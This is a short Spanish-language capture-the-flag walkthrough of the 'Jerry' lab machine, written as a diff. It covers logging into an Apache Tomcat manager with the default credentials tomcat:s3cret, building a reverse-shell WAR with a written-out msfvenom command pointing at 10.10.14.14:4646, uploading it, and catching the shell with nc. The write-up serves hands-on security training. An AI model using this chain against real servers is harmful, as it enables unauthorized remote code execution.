@@ -1,0 +1,65 @@
+maquina Jerry --------------------- Windows
+
+aprendijages 
+
+Tomcat
+Penetration Tester Level 1
+Web
+Vulnerability Assessment
+Common Services
+Security Tools
+SILENTTRINITY
+mimikatz
+Java
+Brute Force Attack
+Password Dump
+Remote Code Execution
+Arbitrary File Upload
+Default Credentials
+
+
+------------------------------------------------
+
+
+cuando escaneamos con nmap la ip nos da un puerto 8080 abierto y tendremos que poner el puerto especificado
+en la url, una vez dentro nos da una version de apache tomcat y un sitio para hacer de manager. 
+
+viendo un poco la url nos da unas contraseñas por defecto para poder administrar la pagina 
+
+tomcat:s3cret 
+
+cuando las metemos en el login nos da un panel para poder administrar las aplicaciones de la pagina
+y podemos ver que podemos subir binarios .war 
+
+hemos utilizado una herramienta para poder crear un documento war malicionso mandandole una reverseshell
+
+para encontrar el payload concreto con la herramienta msfvenom tienes que grepearlo. 
+
+msfvenom -l payloads | grep java
+
+hemos utilizado este
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=4646 -f war -o ~eltrompazo/Descargas/consola.war
+
+con ese comando hemos creado el documento y lo hemos subido una vez esta subido solo ha sido ponernos en escucha
+con un nc -lnvp y listo. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
